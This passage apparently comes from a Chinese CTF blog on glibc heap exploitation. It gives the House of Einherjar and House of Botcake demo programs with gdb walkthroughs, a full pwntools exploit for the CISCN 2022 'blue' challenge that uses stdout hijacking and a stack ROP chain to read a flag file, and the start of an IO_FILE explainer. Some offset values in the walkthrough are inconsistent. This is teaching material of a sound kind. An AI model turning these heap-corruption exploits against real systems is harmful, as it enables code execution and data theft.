chunk_at_offset(p,-((long)prevsize));//堆块p的指针最后由chunk_at_offset()函数决定，chunk_at_offset()函数如下图，作用是将原本p指针位置加上s偏移后的位置作为合并堆块的新指针。那么带回到free函数中，意思就是原本p指针需要减去（向后）一个后向堆块size（p-&gt;prev_size）大小的偏移后得到合并堆块的新指针    unlink(av, p, bck, fwd);//unlink检查&#125;\ndebug程序来自how2heap还是放个原程序在这吧\n//gcc house_of_einherjar.c -g -o einherjar#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;/*   Credit to st4g3r for publishing this technique   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. */int main()&#123;\tsetbuf(stdin, NULL);\tsetbuf(stdout, NULL);\tprintf(&quot;Welcome to House of Einherjar!\\n&quot;);\tprintf(&quot;Tested in Ubuntu 18.04.4 64bit.\\n&quot;);\tprintf(&quot;This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.\\n&quot;);\tprintf(&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\\n&quot;);\tuint8_t* a;\tuint8_t* b;\tuint8_t* d;\tprintf(&quot;\\nWe allocate 0x38 bytes for &#x27;a&#x27;\\n&quot;);\ta = (uint8_t*) malloc(0x38);\tprintf(&quot;a: %p\\n&quot;, a);   \tint real_a_size = malloc_usable_size(a);\tprintf(&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\\n&quot;, real_a_size);\t// create a fake chunk\tprintf(&quot;\\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\\n&quot;);\tprintf(&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\\n&quot;);\tprintf(&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\\n&quot;);\tprintf(&quot;(although we could do the unsafe unlink technique here in some scenarios)\\n&quot;);\tsize_t fake_chunk[6];\tfake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size\tfake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin\tfake_chunk[2] = (size_t) fake_chunk; // fwd\tfake_chunk[3] = (size_t) fake_chunk; // bck\tfake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize\tfake_chunk[5] = (size_t) fake_chunk; //bck_nextsize\tprintf(&quot;Our fake chunk at %p looks like:\\n&quot;, fake_chunk);\tprintf(&quot;prev_size (not used): %#lx\\n&quot;, fake_chunk[0]);\tprintf(&quot;size: %#lx\\n&quot;, fake_chunk[1]);\tprintf(&quot;fwd: %#lx\\n&quot;, fake_chunk[2]);\tprintf(&quot;bck: %#lx\\n&quot;, fake_chunk[3]);\tprintf(&quot;fwd_nextsize: %#lx\\n&quot;, fake_chunk[4]);\tprintf(&quot;bck_nextsize: %#lx\\n&quot;, fake_chunk[5]);\t/* In this case it is easier if the chunk size attribute has a least significant byte with\t * a value of 0x00. The least significant byte of this will be 0x00, because the size of \t * the chunk includes the amount requested plus some amount required for the metadata. */\tb = (uint8_t*) malloc(0x4f8);\tint real_b_size = malloc_usable_size(b);\tprintf(&quot;\\nWe allocate 0x4f8 bytes for &#x27;b&#x27;.\\n&quot;);\tprintf(&quot;b: %p\\n&quot;, b);\tuint64_t* b_size_ptr = (uint64_t*)(b - 8);\t/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/\tprintf(&quot;\\nb.size: %#lx\\n&quot;, *b_size_ptr);\tprintf(&quot;b.size is: (0x500) | prev_inuse = 0x501\\n&quot;);\tprintf(&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\\n&quot;);\t/* VULNERABILITY */\ta[real_a_size] = 0; \t/* VULNERABILITY */\tprintf(&quot;b.size: %#lx\\n&quot;, *b_size_ptr);\tprintf(&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;\t\t   &quot;don&#x27;t change the size of b, only its prev_inuse bit\\n&quot;);\tprintf(&quot;If it had been modified, we would need a fake chunk inside &quot;\t\t   &quot;b where it will try to consolidate the next chunk\\n&quot;);\t// Write a fake prev_size to the end of a\tprintf(&quot;\\nWe write a fake prev_size to the last %lu bytes of a so that &quot;\t\t   &quot;it will consolidate with our fake chunk\\n&quot;, sizeof(size_t));\tsize_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);\tprintf(&quot;Our fake prev_size will be %p - %p = %#lx\\n&quot;, b-sizeof(size_t)*2, fake_chunk, fake_size);\t*(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;\t//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size\tprintf(&quot;\\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\\n&quot;);\tfake_chunk[1] = fake_size;\t// free b and it will consolidate with our fake chunk\tprintf(&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\\n&quot;);\tfree(b);\tprintf(&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n&quot;, fake_chunk[1]);\t//if we allocate another chunk before we free b we will need to \t//do two things: \t//1) We will need to adjust the size of our fake chunk so that\t//fake_chunk + fake_chunk&#x27;s size points to an area we control\t//2) we will need to write the size of our fake chunk\t//at the location we control. \t//After doing these two things, when unlink gets called, our fake chunk will\t//pass the size(P) == prev_size(next_chunk(P)) test. \t//otherwise we need to make sure that our fake chunk is up against the\t//wilderness\t//\tprintf(&quot;\\nNow we can call malloc() and it will begin in our fake chunk\\n&quot;);\td = malloc(0x200);\tprintf(&quot;Next malloc(0x200) is at %p\\n&quot;, d);\tassert((long)d == (long)&amp;fake_chunk[2]);&#125;\n我去除了大部分的英文但保留了漏洞利用这样才知道打的是house_of_einherjar(doge)其实是方便调试如下:\n//gcc house_of_einherjar.c -g -o einherjar#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;int main()&#123;\tsetbuf(stdin, NULL);\tsetbuf(stdout, NULL);\tuint8_t* a;\tuint8_t* b;\tuint8_t* d;\t//create 0x48(0x38+0x10)size chunka \ta = (uint8_t*) malloc(0x38);\tprintf(&quot;a: %p\\n&quot;, a);   \tint real_a_size = malloc_usable_size(a);\tprintf(&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\\n&quot;, real_a_size);\t// create a fake chunk\tsize_t fake_chunk[6];\tfake_chunk[0] = 0x100; \tfake_chunk[1] = 0x100; \tfake_chunk[2] = (size_t) fake_chunk; \tfake_chunk[3] = (size_t) fake_chunk; \tfake_chunk[4] = (size_t) fake_chunk; \tfake_chunk[5] = (size_t) fake_chunk; \t//create 0x508(0x4f8+0x10) chunkb \tb = (uint8_t*) malloc(0x4f8);\tint real_b_size = malloc_usable_size(b);\tuint64_t* b_size_ptr = (uint64_t*)(b - 8);\tprintf(&quot;\\nb.size: %#lx\\n&quot;, *b_size_ptr);\ta[real_a_size] = 0; \tprintf(&quot;b.size: %#lx\\n&quot;, *b_size_ptr);\tsize_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);\tprintf(&quot;Our fake prev_size will be %p - %p = %#lx\\n&quot;, b-sizeof(size_t)*2, fake_chunk, fake_size);\t*(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;\tfake_chunk[1] = fake_size;\tfree(b);\tprintf(&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n&quot;, fake_chunk[1]);\td = malloc(0x200);\tprintf(&quot;Next malloc(0x200) is at %p\\n&quot;, d);\tassert((long)d == (long)&amp;fake_chunk[2]);&#125;\nfrom GPT\n变量声明：程序声明了三个指向 uint8_t 类型的指针变量 a, b, d，用于存储内存地址。a = (uint8_t*) malloc(0x38);：通过 malloc 函数分配了 0x38 字节大小的内存，并将其起始地址赋给变量 a。输出地址：使用 printf 语句打印变量 a 的地址。int real_a_size = malloc_usable_size(a);：使用 malloc_usable_size 函数获取由 malloc 分配的实际可使用的内存大小，并将结果保存在变量 real_a_size 中。打印实际大小：打印变量 real_a_size 的值。声明数组变量：声明了一个名为 fake_chunk 的大小为 6 的 size_t 类型的数组。初始化数组：给数组元素赋值。这个数组用于构造一个假的堆块结构。输出数组内容：使用 printf 打印数组 fake_chunk 中的内容。b = (uint8_t*) malloc(0x4f8);：通过 malloc 函数分配了 0x4f8 字节大小的内存，并将其起始地址赋给变量 b。获取实际大小：使用 malloc_usable_size 函数获取由 malloc 分配的实际可使用的内存大小，并将结果保存在变量 real_b_size 中。输出地址：打印变量 b 的地址。uint64_t* b_size_ptr = (uint64_t*)(b - 8);：声明一个指向 uint64_t 类型的指针变量 b_size_ptr，并将其指向变量 b 前面 8 个字节。输出 b.size：打印变量 b_size_ptr 的值，即变量 b 前面 8 个字节中保存的数值。内存溢出：通过写入 a[real_a_size] = 0;，在变量 a 的末尾写入一个字节的数据，可能导致溢出。输出 b.size：再次打印变量 b_size_ptr 的值，查看是否受到内存溢出的影响。计算假的 prev_size：通过计算两个内存地址之间的偏移量来计算假的 prev_size 值。写入假的 prev_size：将计算得到的假的 prev_size 值写入 a 的末尾，以模拟一个被溢出修改的堆块。更新 fake_chunk[1]：更新数组 fake_chunk 的第二个元素，使其与假的 prev_size 值保持一致。释放 b：使用 free 函数释放变量 b 所指向的内存块。输出 fake chunk 大小：打印更新后的假的堆块大小。d = malloc(0x200);：通过 malloc 函数分配了 0x200 字节大小的内存，并将其起始地址赋给变量 d。输出下一个分配的地址：打印变量 d 的地址。使用 assert 函数进行断言判断：判断变量 d 是否等于 &amp;fake_chunk[2]。\n程序先创建了以下两个堆块和中间一个“堆块”chunka\npwndbg&gt; x/8gx 0x5555557572500x555555757250:\t0x0000000000000000\t0x00000000000000410x555555757260:\t0x0000000000000000\t0x00000000000000000x555555757270:\t0x0000000000000000\t0x00000000000000000x555555757280:\t0x0000000000000000\t0x0000000000000000\nfake_chunk\npwndbg&gt; x/10gx 0x7fffffffe2c00x7fffffffe2c0:\t0x0000000000000100\t0x00000000000001000x7fffffffe2d0:\t0x00007fffffffe2c0\t0x00007fffffffe2c00x7fffffffe2e0:\t0x00007fffffffe2c0\t0x00007fffffffe2c00x7fffffffe2f0:\t0x00007fffffffe3e0\t0x574290d927ca7a000x7fffffffe300:\t0x0000555555554ae0\t0x00007ffff7a03c87\nchunkb\npwndbg&gt; x/10gx 0x5555557572900x555555757290:\t0x0000000000000000\t0x00000000000005010x5555557572a0:\t0x0000000000000000\t0x00000000000000000x5555557572b0:\t0x0000000000000000\t0x00000000000000000x5555557572c0:\t0x0000000000000000\t0x00000000000000000x5555557572d0:\t0x0000000000000000\t0x0000000000000000\n执行\nuint64_t* b_size_ptr = (uint64_t*)(b - 8);\n这里其实就是将chunk_b的malloc指针-0x8的位置，即chunk_b的size值放在了b_size_ptr变量中。\npwndbg&gt; p b_size_ptr$1 = (uint64_t *) 0x555555757298pwndbg&gt; x/2gx 0x5555557572980x555555757298:\t0x0000000000000501\t0x0000000000000000\n再执行\na[real_a_size] = 0;\n这里模拟的就是off-by-one的过程。那么这样一来chunk_b的inuse标志位就被覆盖成了0\n看一下两个chunk注意chunkb的变化\npwndbg&gt; x/20gx 0x5555557572500x555555757250:\t0x0000000000000000\t0x00000000000000410x555555757260:\t0x0000000000000000\t0x00000000000000000x555555757270:\t0x0000000000000000\t0x00000000000000000x555555757280:\t0x0000000000000000\t0x00000000000000000x555555757290:\t0x0000000000000000\t0x0000000000000500**0x5555557572a0:\t0x0000000000000000\t0x00000000000000000x5555557572b0:\t0x0000000000000000\t0x00000000000000000x5555557572c0:\t0x0000000000000000\t0x00000000000000000x5555557572d0:\t0x0000000000000000\t0x00000000000000000x5555557572e0:\t0x0000000000000000\t0x0000000000000000\n执行到\nsize_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);\n\npwndbg&gt; p/x fake_size$2 = 0xffffd55555758fd0\n\nfake_size是由b-sizeof(size_t)2和(uint8_t)fake_chunk相减得到的：\nb-sizeof(size_t)2：chunk_b的malloc指针减去两个地址位宽，也就是chunk_b的头指针(uint8_t)fake_chunk：即是伪造堆块的头指针那么这样一来就可以很明显的看出fake_size，即是chunk_b头指针距离fake_chunk头指针的偏移，需要注意的是我们看到的偏移为0xffffd55555758fd0这代表着偏移其实是一个负数\n执行\n*(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;fake_chunk[1] = fake_size;\n\n看chunkb和fakechunk\npwndbg&gt; x/10gx 0x555555757290 //chunkb0x555555757290:\t0xffffd55555758fd0\t0x00000000000005000x5555557572a0:\t0x0000000000000000\t0x00000000000000000x5555557572b0:\t0x0000000000000000\t0x00000000000000000x5555557572c0:\t0x0000000000000000\t0x00000000000000000x5555557572d0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; x/10gx 0x7fffffffe2c0 //fakechunk0x7fffffffe2c0:\t0x0000000000000100\t0xffffd55555758fd00x7fffffffe2d0:\t0x00007fffffffe2c0\t0x00007fffffffe2c00x7fffffffe2e0:\t0x00007fffffffe2c0\t0x00007fffffffe2c00x7fffffffe2f0:\t0x00007fffffffe3e0\t0x574290d927ca7a000x7fffffffe300:\t0x0000555555554ae0\t0x00007ffff7a03c87\nchunk_b的prev_size等于fake_chunk的size，这个size恰巧又是chunk_b到fake_chunk的偏移，更巧的是chunk_b的inuse标志位为0\n那么如果我们free(b)，os首先会去检查其inuse标志位，发现为0，这就意味着存在一个相邻地址的堆块也是处于释放状态的那么就会根据chunk_b的prev_size先前找是否存在一个大小为0xffffd55555779d41大小的堆块结果根据chunk_b的头指针+0xffffd55555779d41处找到了fake_chunkfake_chunk的size正是我们设置的0xffffd55555779d41根据free函数后向合并机制，由于我们伪造了fake_chunk的fd、bk、fd_nextsize、bk_nextsize，所以可以绕过unlink检查那么chunkb与fakechunk就被合并称为一个大小为fake_size + b_size的大堆块并且合并大堆块的头指针即是fake_chunk的头指针0x7fffffffe2d0\n且，根据top_chunk合并机制，由于chunk_b是紧邻top_chunk的，那么在chunk_b与fake_chunk合并之后top_chunk会收下合并后的整个大堆块新的top_chunk的size变成了old_topchunk_size + fake_chunk_size + chunkb_size。并且top_chunk的头指针会变成合并堆块的头指针，即fake_chunk的头指针0xffffd55555779d41\n接下来我们执行free(b)和malloc(0x200)这两步操作free(b)会完成上述的执行过程而因为bin中没有能够满足malloc(0x200)的空闲块，所以会向top_chunk申请一个size为0x200大小的堆块由于此时top_chunk的头指针是fake_chunk(0x7fffffffe2d0)所以最后被启用的堆块即是以fake_chunk为头指针0x7fffffffe2d0，size为0x210大小的堆块\n这样我们伪造的fakechunk就会被以正常堆块的形式被malloc出来了\npwndbg&gt; cContinuing.Our fake chunk size is now 0xffffd55555779d41 (b.size + fake_prev_size)Next malloc(0x200) is at 0x7fffffffe2d0[Inferior 1 (process 4452) exited normally]\n\n像小时候玩的祖玛\n放个完整的运行信息程序为how2heap源程序house_of_einherjar\nroot@ubuntu:/home/str1k3/Desktop# ./a.outWelcome to House of Einherjar!Tested in Ubuntu 18.04.4 64bit.This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.We allocate 0x38 bytes for &#x27;a&#x27;a: 0x5625ee49e260Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: 0x38We create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stackHowever, you can also create the chunk in the heap or the bss, as long as you know its addressWe set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks(although we could do the unsafe unlink technique here in some scenarios)Our fake chunk at 0x7ffe1bda3090 looks like:prev_size (not used): 0x100size: 0x100fwd: 0x7ffe1bda3090bck: 0x7ffe1bda3090fwd_nextsize: 0x7ffe1bda3090bck_nextsize: 0x7ffe1bda3090We allocate 0x4f8 bytes for &#x27;b&#x27;.b: 0x5625ee49e2a0b.size: 0x501b.size is: (0x500) | prev_inuse = 0x501We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;b.size: 0x500This is easiest if b.size is a multiple of 0x100 so you don&#x27;t change the size of b, only its prev_inuse bitIf it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunkWe write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunkOur fake prev_size will be 0x5625ee49e290 - 0x7ffe1bda3090 = 0xffffd627d26fb200Modify fake chunk&#x27;s size to reflect b&#x27;s new prev_sizeNow we free b and this will consolidate with our fake chunk since b prev_inuse is not setOur fake chunk size is now 0xffffd627d271bf71 (b.size + fake_prev_size)Now we can call malloc() and it will begin in our fake chunkNext malloc(0x200) is at 0x7ffe1bda30a0\n来自hollk师傅的总结利用该方法需要注意的三点\n1.需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分2.需要计算目的 fake_chunk 与 chunk_b 地址之间的差，所以需要泄漏地址3.需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测\n前面的例题，以后再来探索吧\n","categories":["heap"],"tags":["bin"]},{"title":"house_of_botcake","url":"/2023/11/11/house-of-botcake/","content":"glibc高版本2.27之后，简单的tcache bin double free不能实现因为引入了对tcache key的检查如下：\nsize_t tc_idx = csize2tidx (size);if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)  &#123;/* Check to see if it&#x27;s already in the tcache.  */tcache_entry *e = (tcache_entry *) chunk2mem (p);&#125;/* This test succeeds on double free.  However, we don&#x27;t 100%   trust it (it also matches random payload data at a 1 in   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely   coincidence before aborting.  */if (__glibc_unlikely (e-&gt;key == tcache))  &#123;tcache_entry *tmp;LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)  if (tmp == e)malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);/* If we get here, it was a coincidence.  We&#x27;ve wasted a   few cycles, but don&#x27;t abort.  */  &#125;\n当 free 掉一个堆块进入 tcache 时假如堆块的 bk 位存放的 key &#x3D;&#x3D; tcache_key就会遍历这个大小的 Tcache，假如发现同地址的堆块，则触发 Double Free 报错。\n以下程序来自how2heap\n//gcc botcake.c -g  -o botcake //gcc 2heap.c -g -no-pie -no-stack-protector -o heap2stack #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&#123;    setbuf(stdin, NULL);    setbuf(stdout, NULL);//不让_IO_FILE干涉我们的堆块    // prepare the target    intptr_t stack_var[4];    printf(&quot;the target address is %p.\\n\\n&quot;, stack_var);    intptr_t *x[7];    for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++)&#123;        x[i] = malloc(0x100);    &#125;//准备塞满tcache    puts(&quot;Allocating a chunk for later consolidation&quot;);    intptr_t *prev = malloc(0x100);//prev    puts(&quot;Allocating the victim chunk.&quot;);    intptr_t *a = malloc(0x100);//victim    printf(&quot;malloc(0x100): a=%p.\\n&quot;, a);       malloc(0x10);//防止合并     for(int i=0; i&lt;7; i++)&#123;        free(x[i]);    &#125;//填满tcache    free(a);//victim 2 unsortedbin        free(prev);//free掉prev 使其与victim合并        //申请出一个堆块，此时会优先从 Tcache 中取出一个填充堆块腾出位置。然后再 Free 掉 victim ，victim 进入 Tcache，完成 Double Free    malloc(0x100);    /*VULNERABILITY*/    free(a);// a is already freed    /*VULNERABILITY*/    //此时造成堆重叠，一个大的unsortedbin包含一个小的tcachebin    //申请一个比victim大的堆块，可以篡改victim的fwd（next）指针    intptr_t *b = malloc(0x120);    b[0x120/8-2] = (long)stack_var;        // take target out    puts(&quot;Now we can cash out the target chunk.&quot;);    malloc(0x100);    intptr_t *c = malloc(0x100);    printf(&quot;The new chunk is at %p\\n&quot;, c);        // sanity check    assert(c==stack_var);    printf(&quot;Got control on target/stack!\\n\\n&quot;);        //值得注意的是，一次篡改过后，我们可以free掉victim和执行篡改的堆块，再次申请执行篡改的堆块即可再次篡改victim的next指针，多次进行Tcache Poinsoning    return 0;&#125;\n运行结果实际使用看例题\n[CISCN 2022 华东北]blue一键四连check,每次进menu前都会检查malloc_hook free_hook有没有被劫持检查不通过就会调用_exit（不能用exit_hook劫持）add限制size &lt;&#x3D;0x90del是一个正常的delete，无UAFshow仅可以调用一次输入666可以进入仅有一次的UAF\n#prepare house of botcake for i in range(9):    add(0x80, b&#x27;aa&#x27;)add(0x80, b&#x27;aa&#x27;)for i in range(7):    delete(i)magic(8)#show(8)delete(7)add(0x80, b&#x27;aa&#x27;) #0delete(8)#unsortedbin 合并add(0x70, b&#x27;bb&#x27;) #1  分割unsortedbin\n准备house_of_botcake（此处忽略leak_libc_base）\nstdout = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;]p1 = p64(0) + p64(0x91) + p64(stdout) #hijack stdoutadd(0x70, p1) # 2 overlappingadd(0x80, b&#x27;cc&#x27;) # 3\n利用堆重叠，将堆块分配到stdout处，此时的堆结构，三个堆块叠叠乐\nenviron = libc_base + libc.sym[&#x27;environ&#x27;]p2 = p64(0xfbad1800) + p64(0) * 3 + p64(environ) + p64(environ + 8) * 2 #stdout -&gt; environ leak stack_addradd(0x80, p2)   #4stack_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 0x128#add返回的地址\n借助stdout泄露environ中的栈地址，以此获得add的ret地址这两步实际上是覆写了stdout中的flags标志（绕过检查），以及将write_base和write_ptr &amp; write_end改成environ和environ + 8\ndelete(3)delete(2)p3 = p64(0) + p64(0x91) + p64(stack_addr) #再次任意申请申请到栈上add(0x70, p3)#2add(0x80, &#x27;dd&#x27;) #3\n再打一次tcache poisoning，把下一个堆块分配到栈上\np4 = b&#x27;./flag\\x00\\x00&#x27;# open(&#x27;./flag&#x27;, 0)p4 += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(open_addr)# read(3, stack_addr + 0x200, 0x50)p4 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(stack_addr + 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(read_addr)# puts(stack_addr + 0x200)p4 += p64(pop_rdi_ret) + p64(stack_addr + 0x200) + p64(puts_addr)add(0x80, p4)#ret2stack（确实）\n在栈上布置orw的ropchain，由于add的ret地址已经遭到篡改，ret的时候会直接跳到栈上执行ropchain本地打通：\nfrom pwn import*from pwn import p64,u64#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28672)p = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size,payload):    p.recvuntil(&#x27;Choice: &#x27;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&#x27;Please input size: &#x27;)    p.sendline(str(size))    p.recvuntil(b&#x27;Please input content: &#x27;)    p.send(payload)def delete(index):    p.recvuntil(&quot;Choice: &quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;Please input idx: &#x27;)    p.sendline(str(index))def show(index):    p.recvuntil(&quot;Choice: &quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;Please input idx: &quot;)    p.sendline(str(index))def magic(index):    p.recvuntil(&quot;Choice: &quot;)    p.sendline(b&#x27;666&#x27;)    p.recvuntil(b&quot;Please input idx: &quot;)#one_UAF_chance    p.sendline(str(index))#prepare house of botcake &amp;&amp; leak libc basefor i in range(9):    add(0x80, b&#x27;aa&#x27;)add(0x80, b&#x27;aa&#x27;)for i in range(7):    delete(i)magic(8)show(8)show_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))success(&#x27;show_addr = &#x27; + hex(show_addr))libc_base = show_addr - 0x1ecbe0stdout = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;]success(&#x27;stdout = &#x27; + hex(stdout))environ = libc_base + libc.sym[&#x27;environ&#x27;]success(&#x27;environ = &#x27; + hex(environ))delete(7)add(0x80, b&#x27;aa&#x27;) #0delete(8)#unsortedbin 合并add(0x70, b&#x27;bb&#x27;) #1  分割unsortedbinp1 = p64(0) + p64(0x91) + p64(stdout) #hijack stdoutadd(0x70, p1) # 2 overlappingadd(0x80, b&#x27;cc&#x27;) # 3debug()p2 = p64(0xfbad1800) + p64(0) * 3 + p64(environ) + p64(environ + 8) * 2 #stdout -&gt; environ leak stack_addradd(0x80, p2)   #4stack_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 0x128#add返回的地址success(&#x27;stack_addr = &#x27; + hex(stack_addr))delete(3)delete(2)p3 = p64(0) + p64(0x91) + p64(stack_addr) #再次任意申请申请到栈上add(0x70, p3)#2add(0x80, &#x27;dd&#x27;) #3read_addr = libc_base + libc.sym[&#x27;read&#x27;]open_addr = libc_base + libc.sym[&#x27;open&#x27;]write_addr = libc_base + libc.sym[&#x27;write&#x27;]pop_rdi_ret = libc_base + 0x0000000000023b6apop_rsi_ret = libc_base + 0x000000000002601fpop_rdx_ret = libc_base + 0x0000000000142c92flag_addr = stack_addrp4 = b&#x27;./flag\\x00\\x00&#x27;# open(&#x27;./flag&#x27;, 0)p4 += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(open_addr)# read(3, stack_addr + 0x200, 0x50)p4 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(stack_addr + 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(read_addr)# puts(stack_addr + 0x200)puts_addr = libc_base + libc.sym[&#x27;puts&#x27;]p4 += p64(pop_rdi_ret) + p64(stack_addr + 0x200) + p64(puts_addr)add(0x80, p4)#ret2stack（确实）p.interactive()","categories":["heap"],"tags":["bin"]},{"title":"IO_FILE","url":"/2023/09/14/IO-FILE/","content":"部分堆题没有给予我们打印堆块中间的机会 这种情况下 无法通过unsortedbin来泄露基址 这里学习一种新办法 通过io file来泄露基址\n在一个程序中 初始的文件描述符为1,2,3 分别对应着标准输入 标准输出 标准错误 当我们调用scanf函数或者read函数的时候 就会通过调用文件描述符0来从终端输入数据 也就意味着我们可以利用这一点来做到泄露数据\nFILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中，然后以链表的形式串联起来，但系统一开始会自动创建的三个文件即stdin、stdout、stderr，它们是在libc上。\nstruct _IO_FILE_plus&#123;    _IO_FILE    file;    _IO_jump_t   *vtable;&#125;\n_IO_FILE的源码\nstruct _IO_FILE &#123;int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags   /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;   /* Current read pointer */  char* _IO_read_end;   /* End of get area. */  char* _IO_read_base;  /* Start of putback+get area. */  char* _IO_write_base; /* Start of put area. */  char* _IO_write_ptr;  /* Current put pointer. */  char* _IO_write_end;  /* End of put area. */  char* _IO_buf_base;   /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */   struct _IO_marker *_markers;   struct _IO_FILE *_chain;   int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */ #define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1]; /*  char* _save_gptr;  char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;\n_IO_list_all变量，其指向FILE链表的头部，结合上面的结构体可知file对应的就是_IO_FILE结构类型vtable对应的就是_IO_jump_t类型。在没有创建其它文件结构时，_IO_list_all指向stderr，然后依次是stdout和stdin，这里通过在前面加上结构体类型可以详细的打印其内存数据信息\npwndbg&gt; p /x *(struct _IO_FILE_plus *) _IO_list_all$1 = &#123;  file = &#123;    _flags = 0xfbad2086,     _IO_read_ptr = 0x0,     _IO_read_end = 0x0,     _IO_read_base = 0x0,     _IO_write_base = 0x0,     _IO_write_ptr = 0x0,     _IO_write_end = 0x0,     _IO_buf_base = 0x0,     _IO_buf_end = 0x0,     _IO_save_base = 0x0,     _IO_backup_base = 0x0,     _IO_save_end = 0x0,     _markers = 0x0,     _chain = 0x7ffff7dce760,     _fileno = 0x2,     _flags2 = 0x0,     _old_offset = 0xffffffffffffffff,     _cur_column = 0x0,     _vtable_offset = 0x0,     _shortbuf = &#123;0x0&#125;,     _lock = 0x7ffff7dcf8b0,     _offset = 0xffffffffffffffff,     _codecvt = 0x0,     _wide_data = 0x7ffff7dcd780,     _freeres_list = 0x0,     _freeres_buf = 0x0,     __pad5 = 0x0,     _mode = 0x0,     _unused2 = &#123;0x0 &lt;repeats 20 times&gt;&#125;  &#125;,   vtable = 